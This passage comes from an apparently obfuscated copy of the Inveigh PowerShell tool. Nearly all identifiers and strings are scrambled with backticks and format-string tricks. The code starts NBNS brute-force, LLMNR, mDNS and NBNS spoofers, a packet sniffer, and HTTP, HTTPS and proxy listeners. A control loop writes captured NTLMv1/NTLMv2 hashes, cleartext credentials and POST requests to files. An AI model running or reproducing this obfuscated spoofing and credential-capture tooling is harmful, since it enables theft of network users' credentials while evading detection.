                            ${i`N`VEigh}."lOG_`FiLe_`q`Ue`Ue".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - Pausing NBNS brute force spoofer "))
                        }

                        if(${i`NvE`IGh}."l`oG_ou`TPuT")
                        {
                            ${I`NV`eigH}."L`oG".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - Pausing NBNS brute force spoofer "))
                        }

                    }
                
                }
            
            }
        
        }

        &("{0}{1}{2}" -f'Start-Sle','e','p') -m 5
    }

    ${nBnS_`Br`UtE`FORCE_udp_`c`LI`Ent}.("{0}{1}"-f 'Clo','se').Invoke()
}


${CO`N`TROL_sCrIpTB`LOCk} = 
{
    param (${c`O`NSOLEqUeueL`I`mIT},${n`BnSBR`UTE`ForCEPA`USE},${R`U`NcOUNt},${RunTi`mE})

    ${INv`eI`gh}."C`O`NTROl" = ${t`RUE}

    function stop`in`VEigh
    {
        param ([String]${ExIt_`m`ESSa`Ge})

        if(${in`VE`igH}."HT`TpS" -and !${IN`VeI`gH}."hTTp`s`_`EXi`StInG_cERti`Fic`ATE" -or (${INV`e`igh}."Ht`T`ps_Ex`Is`T`IN`G_certIfi`c`ATE" -and ${IN`VEIGH}."HTtPs`_`F`oRce_cER`TiF`i`cATe_`deL`ete"))
        {

            try
            {
                ${CertIf`IcATe`_st`oRe} = &("{1}{2}{0}"-f 't','New-Ob','jec') ("{14}{10}{1}{2}{8}{5}{9}{7}{12}{6}{11}{3}{4}{13}{0}" -f 're','.Secu','rity','tif','icates.X','ry','hy.X','og','.C','pt','em','509Cer','rap','509Sto','Syst')("My",("{1}{2}{0}" -f'e','Loca','lMachin'))
                ${cerTIFIcaTe`_`s`Tore}.("{1}{0}" -f'n','Ope').Invoke(("{2}{1}{0}" -f'e','Writ','Read'))
                ${ceR`Ti`Fi`CA`Tes} = (&("{0}{2}{1}" -f'Get-ChildIt','m','e') (("{2}{1}{4}{0}{3}" -f 'chi','rt:oL7Loca','Ce','neoL7My','lMa'))."r`epL`ACe"('oL7',[sTRINg][cHar]92) | &("{2}{1}{0}{3}"-f '-Objec','re','Whe','t') {${_}."iSS`U`Er" -Like "CN=" + ${I`NVE`iGH}."CertIF`iCA`T`E_i`sSUer"})

                ForEach(${CE`R`TifICate} in ${CErTIfI`C`AteS})
                {
                    ${C`ERtIf`I`cate`_STORE}.("{2}{1}{0}" -f'e','v','Remo').Invoke(${cer`TiFICa`TE})
                }

                ${CErT`IF`ica`TE_stO`Re}.("{1}{0}"-f'lose','C').Invoke()
            }
            catch
            {
                ${inVE`I`gH}."CO`NsOLe`_Qu`eue".("{0}{1}"-f 'A','dd').Invoke(("{6}{5}{8}{7}{2}{0}{1}{4}{3}" -f'ror - R','emo','Er','ly','ve Manual','ertifi','SSL C',' ','cate Deletion'))

                if(${In`V`eigh}."fI`LE_`ouTp`UT")
                {
                    ${I`Nve`IgH}."l`og_fiL`e_`que`UE".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually "))
                }

                if(${in`VE`Igh}."LO`g_o`UT`pUT")
                {
                    ${Inv`E`IgH}."L`Og".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually "))
                }

            }

        }
        
        if(${i`NveigH}."RUnN`inG")
        {
            &("{0}{3}{2}{1}" -f'Start','leep','S','-') -S 1
            ${i`N`VeiGH}."CONsO`le_Qu`eUe".("{0}{1}" -f'A','dd').Invoke(("Inveigh exited due to $exit_message at $(Get-Date -format 's') "))

            if(${iN`VEIGH}."F`IlE_`OUTput")
            {
                ${i`NveI`Gh}."l`OG`_Fil`e_Queue".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Inveigh exited due to $exit_message "))
            }

            if(${i`N`VEIgh}."lO`g`_oUtpUt")
            {
                ${i`NVei`gh}."L`og".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - Inveigh exited due to $exit_message "))
            }

            &("{0}{3}{2}{1}" -f 'Star','p','-Slee','t') -S 1
            ${INv`EIGH}."Run`N`ING" = ${fa`lSE}
        }

        if(${iN`VEI`gH}."rElaY_`Ru`N`NInG")
        {
            &("{2}{0}{3}{1}"-f'rt-S','eep','Sta','l') -S 1
            ${in`V`eIgH}."c`oN`So`LE_q`Ueue".("{0}{1}"-f'Ad','d').Invoke(("Inveigh Relay exited due to $exit_message at $(Get-Date -format 's') "))

            if(${inV`e`iGh}."f`iL`E_`oUTPUT")
            {
                ${iN`VE`IGh}."LOG`_FILe`_q`UeuE".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message "))
            }

            if(${inv`E`iGh}."lO`g_O`UTput")
            {
                ${I`NVeigH}."L`oG".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message "))
            }

            &("{0}{1}{2}{3}"-f 'S','tart','-Sl','eep') -S 1
            ${InvE`IgH}."rEL`A`Y_ruNNiNg" = ${fAl`sE}

        } 

        ${IN`VEiGH}."h`TTps" = ${F`A`Lse}
    }

    if(${nbnSB`RUt`EF`ORCePausE})
    {   
        ${N`Bns_`pa`USe} = &("{2}{1}{0}"-f 'n','a','New-TimeSp') -Seconds ${NbN`sBR`UT`e`ForcEP`A`USe}
    }

    ${Run`_C`OuNt_`NTlMv1} = ${rU`N`COunT} + ${Inv`eiGh}."ntLMv1_l`I`St"."CO`UNt"
    ${r`U`N`_COUn`T_NTLm`V2} = ${r`UnCou`Nt} + ${InV`E`IGH}."NTl`m`V2_l`IsT"."C`OuNt"
    ${RUn_cOu`NT_cLe`AR`TEXT} = ${R`UNc`ouNt} + ${In`VEi`gh}."CL`Earte`Xt_Li`ST"."CO`UNt"

    if(${Run`T`ImE})
    {    
        ${CON`TrO`L_T`iMEO`UT} = &("{3}{0}{1}{2}"-f 'Time','Sp','an','New-') -Minutes ${Ru`N`TimE}
        ${Con`TR`O`L`_STopWAtcH} =  (&("{0}{1}"-f'var','Iable')  BsD ).vaLue::("{1}{2}{0}"-f'w','S','tartNe').Invoke()
    }

    while(${IN`V`Eigh}."RUN`N`ING")
    {

        if(${NbNs`BRu`TeFOR`cePaU`sE} -and ${I`Nv`eiGh}."hOStN`AME`_SPo`Of")
        {
         
            if(${I`NVe`IGH}."Nb`Ns`_S`TopWaTcH"."eLA`PSEd" -ge ${nb`NS`_Pa`USE})
            {
                ${inv`E`IGH}."HO`StnAMe_sp`Oof" = ${Fa`L`sE}
            }
        
        }

        if(${r`U`NCOunT})
        {
            
            if(${Inv`eI`gH}."ntl`mv1`_lIst"."coU`Nt" -ge ${rU`N_coUNt_N`TL`MV1} -or ${IN`VEI`GH}."nTLM`V`2`_LiSt"."Co`UnT" -ge ${r`U`N_c`O`UnT_ntLmV2} -or ${I`Nve`iGH}."Cl`EaR`TeXT_`lI`sT"."c`OUnt" -ge ${RUn_C`ou`Nt_cLE`ARte`xT})
            {
                &("{1}{3}{2}{0}" -f 'veigh','Sto','In','p') ("{0}{1}{2}"-f 'r','un coun','t')           
            }

        }

        if(${Ru`NtI`mE})
        {

            if(${cO`NTr`oL_`S`TopWaT`Ch}."E`lAP`sED" -ge ${cONT`R`ol_T`IMEOUt})
            {
                &("{1}{2}{0}"-f'gh','StopIn','vei') ("{1}{2}{0}" -f 'me','r','un ti')
            }

        }

        if(${inv`e`Igh}."FiL`e_`OUtpUt")
        {

            while(${iNV`Ei`gh}."lOg_fI`le_`queUe"."COU`NT" -gt 0)
            {
                ${I`NVE`IGh}."LOG_Fil`E_`que`UE"[0]|&("{1}{0}{2}" -f 'ut-F','O','ile') ${Inv`eIGH}."lOG`_out`_fILe" -Append
                ${iN`V`eIgh}."l`Og`_FIL`E_QuEuE".("{1}{0}{2}" -f'em','R','oveAt').Invoke(0)
            }

            while(${iNvE`IGh}."NTlMV1_`F`iLE`_`QueUE"."Co`UnT" -gt 0)
            {
                ${i`Nv`eIgh}."NtlMV1_f`Ile`_Q`UeuE"[0]|&("{1}{2}{0}"-f '-File','O','ut') ${I`NveIgh}."n`TlMv1`_O`U`T_file" -Append
                ${IN`Ve`iGh}."ntLmV1_`FIle`_`QUeuE".("{2}{0}{1}" -f've','At','Remo').Invoke(0)
            }

            while(${InVe`igH}."nt`lmV2_`FilE_q`Ueue"."co`Unt" -gt 0)
            {
                ${Invei`GH}."nt`LmV`2`_FIle_`QuEue"[0]|&("{1}{2}{0}" -f 'e','Out','-Fil') ${invE`i`Gh}."ntL`mv2_oUT`_`File" -Append
                ${inve`i`gH}."N`TlmV`2_`F`ILe_q`UeUE".("{1}{2}{0}"-f'oveAt','R','em').Invoke(0)
            }

            while(${in`V`eigH}."C`lEARtexT_`Fi`LE`_QuE`Ue"."C`ouNt" -gt 0)
            {
                ${I`NV`eigh}."Cl`eaRTe`Xt_FILe`_QU`euE"[0]|&("{0}{1}{2}"-f 'O','ut-','File') ${i`NVei`GH}."clEArTExT`_oUt`_`FILE" -Append
                ${I`NVeI`GH}."ClE`Art`ext_`FI`lE_QUeue".("{1}{0}" -f'moveAt','Re').Invoke(0)
            }

            while(${inv`E`IGH}."PoST_RE`q`UE`S`T_FILe_qu`e`Ue"."Co`UnT" -gt 0)
            {
                ${i`NVEIGh}."P`OST_r`eQ`Ue`st_fILE_q`UeUE"[0]|&("{0}{1}"-f 'Ou','t-File') ${in`VEi`Gh}."post_`REqu`e`ST_oUt_`File" -Append
                ${i`NVEIgH}."pOST_R`EQ`UesT_F`ilE_qUe`UE".("{1}{0}{2}" -f'move','Re','At').Invoke(0)
            }

        }

        if(!${i`N`VeiGh}."ConSol`e_O`UtPUT" -and ${Co`NSOLeqU`Eueli`MiT} -ge 0)
        {

            while(${I`Nv`EIGh}."co`NSole_`Q`Ueue"."Co`Unt" -gt ${cON`soLe`Q`Ue`UElImiT} -and !${inV`ei`Gh}."cONS`O`lE_OuTpUT")
            {
                ${inV`E`IgH}."CON`SoLE`_QU`euE".("{1}{0}"-f 'eAt','Remov').Invoke(0)
            }

        }

        &("{2}{1}{0}{3}"-f '-Sl','art','St','eep') -m 5
    }

    ${iN`VEiGh}."Contr`ol" = ${Fa`LSe}
}





function HTTPlI`ST`e`Ner()
{
    ${Pro`Xy`_L`Istener} = ${F`Alse}
    ${http`S_lI`STENER} = ${f`A`lsE}
    ${h`TTp_RunSp`ACE} =   $5ZGH::("{3}{0}{1}{2}"-f 'rea','teRu','nspace','C').Invoke()
    ${htTp`_`RuNspace}.("{1}{0}" -f'pen','O').Invoke()
    ${h`Tt`P`_runSp`ACe}."SeSS`IOn`sta`TePr`oXy".("{2}{3}{1}{0}" -f'iable','ar','Set','V').Invoke(("{2}{1}{0}" -f'gh','nvei','i'),${iN`V`EIgh})
    ${HtT`p`_`POwerShe`ll} =   (  &("{0}{1}{2}"-f'GE','T-IT','em')  vaRIaBle:7K4).VAlue::("{2}{1}{0}" -f'ate','e','Cr').Invoke()
    ${hTTP_powE`RSH`E`lL}."ru`NSPacE" = ${hT`T`p_RU`NsPAcE}
    ${Http`_pO`wErShE`Ll}.("{2}{1}{0}"-f't','p','AddScri').Invoke(${s`HARed_Ba`S`IC_FU`N`CtI`ONs_s`CriP`TbLO`ck}) > ${n`UlL}
    ${HTt`P_p`O`WeRSheLL}.("{1}{2}{0}"-f't','AddScr','ip').Invoke(${HTT`p_S`cRIp`T`BL`OCK}).("{1}{0}{2}{3}"-f'd','A','dArg','ument').Invoke(${ch`A`Ll`EnGe}).("{2}{3}{1}{0}"-f 'ent','um','Ad','dArg').Invoke(${H`TTPA`UTH}).("{2}{0}{1}" -f'rgum','ent','AddA').Invoke(
        ${h`TTPBaSi`C`ReALM}).("{0}{2}{1}"-f 'A','ent','ddArgum').Invoke(${hTtpCoNt`entt`y`pE}).("{1}{2}{0}{3}" -f 'ume','A','ddArg','nt').Invoke(${Ht`TpIP}).("{1}{2}{0}" -f'gument','Ad','dAr').Invoke(${H`T`TppOrT}).("{1}{0}{3}{2}" -f'dAr','Ad','nt','gume').Invoke(
        ${h`TT`PdEFAuLTeXe}).("{0}{1}{2}" -f'A','d','dArgument').Invoke(${HT`T`PDEfa`UlTfilE}).("{1}{2}{0}"-f't','AddArgu','men').Invoke(${h`T`TPdIR}).("{0}{2}{3}{1}" -f'Add','t','Argume','n').Invoke(
        ${H`TTp`ReseTde`Lay}).("{1}{0}{2}"-f'd','Ad','Argument').Invoke(${HTTpre`se`T`D`ElA`YTiMeouT}).("{1}{2}{0}"-f'ument','Add','Arg').Invoke(${htTP`R`Es`P`onSE}).("{2}{0}{1}"-f'u','ment','AddArg').Invoke(
        ${HtTP`s_`L`istener}).("{1}{2}{0}"-f'nt','Ad','dArgume').Invoke(${n`BnsbrU`TefO`R`cEPauSe}).("{2}{3}{1}{0}" -f'ument','g','Ad','dAr').Invoke(${PrO`xy}).("{2}{0}{1}"-f 'r','gument','AddA').Invoke(
        ${P`ROXyiGnO`RE}).("{0}{2}{1}" -f'Add','ument','Arg').Invoke(${P`R`oxy_lISTe`NeR}).("{3}{1}{0}{2}" -f'me','gu','nt','AddAr').Invoke(${WP`A`dAutH}).("{3}{2}{1}{0}"-f'ument','g','r','AddA').Invoke(
        ${wpa`dA`UtHI`Gnore}).("{2}{0}{1}"-f 'ddArgum','ent','A').Invoke(${W`PAdR`eSpO`NSE}) > ${N`Ull}
    ${htTP_PoWe`R`sH`eLl}.("{0}{2}{1}" -f'Beg','nInvoke','i').Invoke() > ${Nu`lL}
}

&("{0}{2}{1}"-f 'St','p','art-Slee') -m 50


function HTt`PS`LisTE`Ner()
{
    ${PrOx`y_`LI`Ste`NEr} = ${f`AlSE}
    ${HtTPS_`LIs`T`eNeR} = ${t`RUe}
    ${htT`Ps_run`S`PACE} =   $5zGh::("{4}{0}{1}{3}{2}" -f 'eateRu','nsp','e','ac','Cr').Invoke()
    ${hTTp`S_R`Un`sp`ACE}.("{1}{0}"-f 'pen','O').Invoke()
    ${h`T`TPs_`RuNSP`ACE}."S`EsS`iO`NsTa`TEPROXy".("{0}{2}{1}"-f'SetVar','e','iabl').Invoke(("{0}{1}" -f'i','nveigh'),${INV`e`IGH})
    ${HTtps`_`pO`w`ER`sHELL} =  $7K4::("{1}{0}{2}" -f'ea','Cr','te').Invoke()
    ${HT`TPs_pOw`ErShE`Ll}."Runs`pAcE" = ${hTtp`s_RuN`sp`A`cE}
    ${HttPs_POW`ER`S`HelL}.("{1}{0}{2}" -f 'ddS','A','cript').Invoke(${shA`ReD`_b`A`sIc_f`UnCtiOns_s`cR`ipt`BLOck}) > ${Nu`LL}
    ${H`TTP`S_pO`we`RsheLl}.("{2}{1}{0}"-f 'dScript','d','A').Invoke(${H`Ttp_Sc`RiPtBLO`ck}).("{0}{1}{2}"-f'Add','Ar','gument').Invoke(${C`HallE`NGE}).("{2}{3}{0}{1}"-f'gumen','t','AddA','r').Invoke(${Ht`TPaUTH}).("{1}{2}{0}" -f'ument','AddAr','g').Invoke(
        ${H`T`TPBASICr`e`Alm}).("{2}{1}{0}" -f'ent','gum','AddAr').Invoke(${HTtp`C`O`Nt`EntTYpE}).("{2}{0}{1}" -f'gume','nt','AddAr').Invoke(${h`T`TPiP}).("{2}{3}{0}{1}" -f'rgumen','t','Add','A').Invoke(${h`TT`PSPorT}).("{0}{1}{3}{2}" -f 'AddAr','gu','nt','me').Invoke(
        ${h`T`TPDEfau`lTexe}).("{0}{1}{2}{3}" -f'A','ddA','rgum','ent').Invoke(${Ht`TpDe`FaULt`F`Ile}).("{1}{2}{0}" -f'ment','AddArg','u').Invoke(${h`T`TpdIR}).("{1}{2}{0}" -f'nt','AddArgum','e').Invoke(
        ${hTtPReS`ETDeL`AY}).("{1}{0}{2}"-f 'ume','AddArg','nt').Invoke(${h`TTp`ReSetde`lAYtIMeo`UT}).("{3}{1}{2}{0}" -f't','ume','n','AddArg').Invoke(${H`T`T`PreSP`oNSE}).("{1}{0}{2}" -f 'dArgum','Ad','ent').Invoke(
        ${H`TT`ps_Listen`ER}).("{1}{2}{0}"-f'rgument','Add','A').Invoke(${nb`N`SB`RUT`EForcePAUse}).("{2}{0}{1}" -f 'gum','ent','AddAr').Invoke(${P`ROXY}).("{1}{0}{2}" -f 'gumen','AddAr','t').Invoke(
        ${pRox`Y`IgNOrE}).("{1}{2}{3}{0}" -f'nt','AddAr','gum','e').Invoke(${pR`O`x`y_listENer}).("{1}{0}{2}{3}"-f 'd','A','dArgum','ent').Invoke(${wPAd`AU`TH}).("{0}{2}{1}" -f 'A','nt','ddArgume').Invoke(
        ${W`p`ADaUt`HIgnorE}).("{0}{2}{1}" -f 'A','gument','ddAr').Invoke(${w`pA`DResp`ONSe}) > ${nu`ll}
    ${H`TTps`_P`owersHell}.("{1}{2}{0}"-f 'ke','Begi','nInvo').Invoke() > ${N`ULL}
}

&("{2}{1}{0}" -f 'ep','Sle','Start-') -m 50


function P`ROXYLis`TenER()
{
    ${P`R`OXY`_lisTe`NER} = ${Tr`Ue}
    ${httPS_Lis`T`e`N`eR} = ${FA`LSe}
    ${PrO`XY`_ruNs`p`Ace} =  (&("{2}{1}{0}"-f'IAbLE','-vAr','get')  ('5z'+'gH')  -vAluEoNLy)::("{2}{3}{1}{0}" -f'e','ac','CreateRuns','p').Invoke()
    ${p`Ro`xY_RU`NspaCe}.("{1}{0}"-f 'n','Ope').Invoke()
    ${PRo`Xy`_RunSpA`CE}."S`Es`SIonst`AtEPrOxY".("{1}{2}{0}"-f 'able','SetV','ari').Invoke(("{0}{1}" -f 'inveig','h'),${iN`VEi`gH})
    ${PR`oxY_Pow`er`SHEll} =  (  &('ls') VArIABLE:7K4).VaLUE::("{0}{1}" -f'C','reate').Invoke()
    ${PrOXy_poW`ERS`hE`ll}."R`UNSp`ACe" = ${P`Ro`xy_rU`N`spAce}
    ${prox`y_pO`W`e`RsHELL}.("{1}{0}"-f'ddScript','A').Invoke(${s`H`AR`eD`_BaSi`C_`FUN`C`TIoNS_scRiPT`B`lOCK}) > ${n`UlL}
    ${p`ROXY_PO`wE`Rsh`ell}.("{1}{2}{0}" -f't','AddScri','p').Invoke(${httP_`sC`RIP`TbL`oCk}).("{2}{0}{1}{3}"-f'dd','Arg','A','ument').Invoke(${CH`ALL`EngE}).("{0}{3}{1}{2}" -f'Add','n','t','Argume').Invoke(${hTT`Pa`Uth}).("{1}{0}{2}" -f 'dArgume','Ad','nt').Invoke(
        ${hT`Tpba`sIC`ReA`lm}).("{0}{3}{2}{1}" -f'Ad','gument','Ar','d').Invoke(${httpco`N`Tent`TyPe}).("{2}{0}{3}{1}"-f'dArg','ent','Ad','um').Invoke(${p`R`OXYIp}).("{1}{2}{3}{0}"-f 't','Ad','dArgume','n').Invoke(${PROxYP`o`Rt}).("{1}{0}{2}{3}"-f'dd','A','Ar','gument').Invoke(
        ${Ht`Tpdef`Au`L`TeXE}).("{1}{2}{0}" -f'ument','AddAr','g').Invoke(${H`Tt`PdEFa`U`lTfiLE}).("{1}{0}{2}" -f'd','A','dArgument').Invoke(${HTT`p`diR}).("{3}{2}{0}{1}"-f 'Ar','gument','dd','A').Invoke(
        ${ht`TP`RE`S`eTDeLay}).("{0}{2}{3}{1}" -f 'A','ument','d','dArg').Invoke(${htTp`Re`SETde`Layti`mEOUt}).("{3}{2}{0}{1}"-f'me','nt','Argu','Add').Invoke(${httpr`E`sPONSe}).("{1}{2}{0}"-f't','AddAr','gumen').Invoke(
        ${h`T`Tps_lIST`EN`eR}).("{2}{1}{0}"-f'ent','dArgum','Ad').Invoke(${nBnS`BRUt`efor`Ce`Pa`U`SE}).("{1}{2}{0}"-f 'ument','A','ddArg').Invoke(${pr`O`Xy}).("{1}{0}{3}{2}"-f'ddArg','A','ent','um').Invoke(
        ${p`ROxYi`gno`RE}).("{1}{0}{2}"-f 'gume','AddAr','nt').Invoke(${PrOxy_L`IS`Ten`eR}).("{0}{1}{2}"-f 'Ad','d','Argument').Invoke(${wp`A`d`AUtH}).("{3}{1}{2}{0}"-f'nt','dArgu','me','Ad').Invoke(
        ${wpaDautHI`gn`o`Re}).("{2}{0}{1}"-f 'rgum','ent','AddA').Invoke(${W`pA`DRESpo`Nse}) > ${Nu`LL}
    ${Pro`xY_p`oWERs`h`e`Ll}.("{2}{1}{0}" -f'e','inInvok','Beg').Invoke() > ${n`Ull}
}


function SNIF`FErs`pOO`F`ER()
{
    ${SnifFeR`_Run`Sp`A`CE} =   $5zGh::("{3}{2}{1}{0}" -f 'ace','unsp','eateR','Cr').Invoke()
    ${S`NiFFER`_runsPA`CE}.("{1}{0}"-f'pen','O').Invoke()
    ${SnIffe`R_rUns`p`ACe}."se`s`SioN`sTa`TepROXy".("{1}{2}{0}{3}" -f 'b','SetVari','a','le').Invoke(("{1}{0}"-f 'nveigh','i'),${i`N`VEiGh})
    ${Sn`iFf`eR`_pOwErSHeLL} =  (&("{3}{2}{0}{1}" -f 'AB','lE','T-vARI','gE') 7k4  -VA )::("{0}{1}" -f'Creat','e').Invoke()
    ${sNIFF`e`R_POw`erS`Hell}."RuNS`Pa`CE" = ${S`N`If`FER`_RUNSpAce}
    ${SnI`Ff`er`_`Po`werSHElL}.("{1}{0}"-f 'ddScript','A').Invoke(${ShaRe`d`_bA`s`IC_fuNCtIo`NS_S`Criptb`loCk}) > ${Nu`ll}
    ${Snif`FER_po`W`er`ShEll}.("{1}{2}{0}"-f'ipt','Ad','dScr').Invoke(${smb`_N`T`Lm_`F`UNcTio`N`s_SCR`ipTblOck}) > ${N`ULL}
    ${sNI`FfEr_P`OWE`R`s`Hell}.("{1}{0}{2}" -f'Scri','Add','pt').Invoke(${SN`i`FFER`_`sCriptblO`cK}).("{2}{1}{0}" -f 'Argument','d','Ad').Invoke(${i`p}).("{1}{2}{0}{3}"-f'rg','Add','A','ument').Invoke(${lL`M`Nr}).("{0}{1}{2}" -f'A','ddAr','gument').Invoke(
        ${llMNR_reSpO`Nse_me`s`s`A`Ge}).("{2}{0}{1}"-f 'ddArgumen','t','A').Invoke(${llMN`R`T`Tl}).("{2}{3}{0}{1}"-f 'rgu','ment','A','ddA').Invoke(${m`Dns}).("{3}{0}{1}{2}"-f'dArg','ume','nt','Ad').Invoke(
        ${M`Dns`_resp`onsE_mEs`S`Age}).("{1}{3}{2}{0}" -f 'nt','AddA','ume','rg').Invoke(${mdNst`YP`Es}).("{1}{2}{0}"-f 'Argument','Ad','d').Invoke(${Mdn`s`Ttl}).("{1}{2}{0}" -f 't','Ad','dArgumen').Invoke(
        ${Nb`NS}).("{2}{1}{0}"-f 'ment','gu','AddAr').Invoke(${n`BN`s_reSP`ONSE_`mEssAGe}).("{1}{2}{0}" -f 'nt','AddAr','gume').Invoke(${n`BnSTy`p`es}).("{2}{0}{1}" -f 'dAr','gument','Ad').Invoke(${NBn`sT`Tl}).("{1}{0}{2}"-f'um','AddArg','ent').Invoke(
        ${S`mB}).("{1}{3}{2}{0}"-f'ent','AddA','m','rgu').Invoke(${S`po`O`F`ERHOStsiG`NORe}).("{2}{0}{1}"-f 'u','ment','AddArg').Invoke(${SPOO`F`Erh`oSts`Rep`Ly}).("{2}{3}{1}{0}" -f 'ument','Arg','Ad','d').Invoke(
        ${sPO`ofE`RIP}).("{1}{0}{2}"-f'g','AddAr','ument').Invoke(${S`pooferiPsI`GN`o`Re}).("{2}{1}{3}{0}"-f't','dArgum','Ad','en').Invoke(${S`pO`Oferi`pSRepLy}).("{0}{1}{2}"-f 'AddArgum','en','t').Invoke(
        ${spo`O`Fer`LeaRNiNg}).("{1}{0}{2}" -f 'Argum','Add','ent').Invoke(${sp`O`o`FerlE`A`RNingD`eLaY}).("{2}{0}{1}{3}" -f'Arg','um','Add','ent').Invoke(${SPoo`FEr`l`EarniNgI`N`Te`Rv`AL}) > ${n`ULL}
    ${S`NifFER_pOwe`R`sHElL}.("{1}{3}{0}{2}" -f'inInv','Be','oke','g').Invoke() > ${n`ULl}
}


function L`lm`Nr`SPOOfeR()
{
    ${l`l`MNR_Spo`OFeR_RuNS`PACe} =   $5ZGh::("{0}{2}{1}" -f 'Cr','nspace','eateRu').Invoke()
    ${l`l`mn`R_`sPOoFer_r`UnsPACE}.("{1}{0}"-f 'pen','O').Invoke()
    ${LlMNr_sp`OoF`ER_RUns`PA`Ce}."SEssion`s`TaTE`p`ROXY".("{2}{1}{0}"-f'riable','etVa','S').Invoke(("{1}{0}" -f 'eigh','inv'),${I`N`VEiGH})
    ${l`LmNr`_`SpoOFER`_POwErs`hELL} =  $7k4::("{0}{1}" -f 'Creat','e').Invoke()
    ${LlM`NR_SPO`oFEr_`PoW`ERshElL}."R`UNSpAcE" = ${lL`mnr_SPOO`FER`_RUn`Sp`A`ce}
    ${L`LmnR_SpOOfEr_P`OWER`sHE`Ll}.("{1}{0}{3}{2}" -f'dd','A','cript','S').Invoke(${SHA`Re`d_`BAS`iC_FunCtioNs_SC`R`iPTBlock}) > ${n`UlL}
    ${l`LMnR_`spoo`Fe`R_PoWeRS`hE`Ll}.("{1}{3}{0}{2}" -f 'cri','A','pt','ddS').Invoke(${l`LMNr`_sP`oofer`_scRIpTbL`OCK}).("{0}{2}{1}" -f'A','gument','ddAr').Invoke(${InS`P`ect}).("{1}{0}{2}" -f'me','AddArgu','nt').Invoke(
        ${lLmN`R_`Resp`Ons`e_MES`sA`GE}).("{1}{0}{2}"-f'Argu','Add','ment').Invoke(${S`pO`OfErIP}).("{3}{2}{1}{0}"-f't','men','Argu','Add').Invoke(${Sp`O`ofE`RhO`STsrEply}).("{0}{2}{1}" -f 'AddArgum','t','en').Invoke(
        ${SPOo`Fer`hO`S`TsIgNORE}).("{0}{1}{3}{2}" -f'Add','Arg','t','umen').Invoke(${s`POOFerIps`Re`pLy}).("{0}{1}{3}{2}"-f'Ad','dArgum','nt','e').Invoke(${SpOof`erIp`S`i`gnOre}).("{1}{2}{3}{0}" -f 'ument','A','dd','Arg').Invoke(
        ${LL`MN`RTtl}) > ${n`Ull}
    ${lLM`Nr_`spoOf`er_po`WER`she`ll}.("{2}{1}{0}"-f 'inInvoke','g','Be').Invoke() > ${n`Ull}
}


function mdnSSpo`O`FeR()
{
    ${mdn`S_Spoo`FEr_Ru`NsPA`Ce} =   $5ZGH::("{3}{2}{0}{1}" -f 'c','e','nspa','CreateRu').Invoke()
    ${MdNs`_`spO`O`FER_Run`SPaCe}.("{0}{1}"-f'Op','en').Invoke()
    ${md`N`s_`SPOOfer_Ru`NS`paCe}."SE`SSiON`sTATEpR`oxy".("{0}{1}{3}{2}" -f'SetV','aria','e','bl').Invoke(("{1}{2}{0}" -f'h','inv','eig'),${Inve`i`GH})
    ${mdNS_`SPOo`FEr`_POw`ErShe`ll} =  (&("{0}{1}"-f 'vARiAbl','E')  7K4 -ValuEoNlY)::("{1}{0}" -f'te','Crea').Invoke()
    ${Md`Ns`_S`PO`OfeR`_`pOwerSHELl}."ru`N`sPACe" = ${m`dns_sp`o`Ofe`R_runsPACE}
    ${mdnS_sPOOfEr_p`OW`eR`Sh`Ell}.("{2}{1}{3}{0}" -f 't','dS','Ad','crip').Invoke(${Sh`A`R`ed_bASiC_FunCtI`ONS_`ScriP`T`BloCk}) > ${N`ULL}
    ${MD`Ns`_SPOOfer`_PoWErsh`Ell}.("{0}{1}" -f'AddScrip','t').Invoke(${Mdns_`spOO`FeR_SCr`i`PtBlock}).("{1}{2}{0}"-f 'Argument','Ad','d').Invoke(${INS`pe`CT}).("{0}{1}{2}"-f 'AddA','rg','ument').Invoke(
        ${mdN`s_`Resp`onSe`_M`esSA`ge}).("{0}{1}{2}"-f'AddArgum','e','nt').Invoke(${M`dNsTtl}).("{2}{0}{1}" -f 'dAr','gument','Ad').Invoke(${MD`NS`T`Ypes}).("{3}{0}{2}{1}" -f 'd','nt','Argume','Ad').Invoke(${sp`OOF`eriP}).("{1}{2}{0}" -f'ment','AddAr','gu').Invoke(
        ${s`p`oo`FerHOst`srep`lY}).("{0}{1}{2}" -f 'Ad','d','Argument').Invoke(${SpoofeR`H`o`Stsi`gNorE}).("{0}{1}{2}"-f'Ad','dArg','ument').Invoke(${sPOo`FErI`Psr`EPlY}).("{2}{3}{0}{1}" -f'umen','t','AddAr','g').Invoke(
        ${Sp`oOFEripSig`No`Re}) > ${Nu`ll}
    ${m`dN`S_sp`oofEr_P`OwErSHE`Ll}.("{0}{2}{1}" -f 'Begi','Invoke','n').Invoke() > ${nu`LL}
}


function N`BNsSpOoF`eR()
{
    ${nb`Ns_`sP`o`oFeR_rUn`SP`Ace} =   (  &("{2}{1}{0}{3}"-f'hildIte','-c','Get','M')  VAriablE:5zGh).VALue::("{1}{3}{0}{2}" -f 'eateR','C','unspace','r').Invoke()
    ${nBNs_`s`pO`O`Fer_RUnSP`A`cE}.("{1}{0}" -f'n','Ope').Invoke()
    ${NB`Ns_SpOO`Fer_`RunsP`ACe}."sEss`ionsTAtE`PRo`XY".("{1}{0}{2}" -f'tVaria','Se','ble').Invoke(("{0}{1}"-f'i','nveigh'),${I`NvEI`Gh})
    ${Nbns_S`pO`o`Fer`_`PowERShE`lL} =   ( &("{0}{1}" -f 'gEt-','Item') vArIable:7k4 ).vALUE::("{0}{1}" -f 'Cre','ate').Invoke()
    ${Nb`Ns`_`SPOO`Fer_`PoWeR`sheLL}."rUn`sp`ACE" = ${N`BN`S_Spoofe`R`_RU`NS`PACe}
    ${NbNs`_Spo`oFeR_`POweRsh`elL}.("{1}{0}"-f 't','AddScrip').Invoke(${s`hA`ReD_`BaS`ic_fUn`ctiON`s_`s`crIptBlO`cK}) > ${Nu`lL}
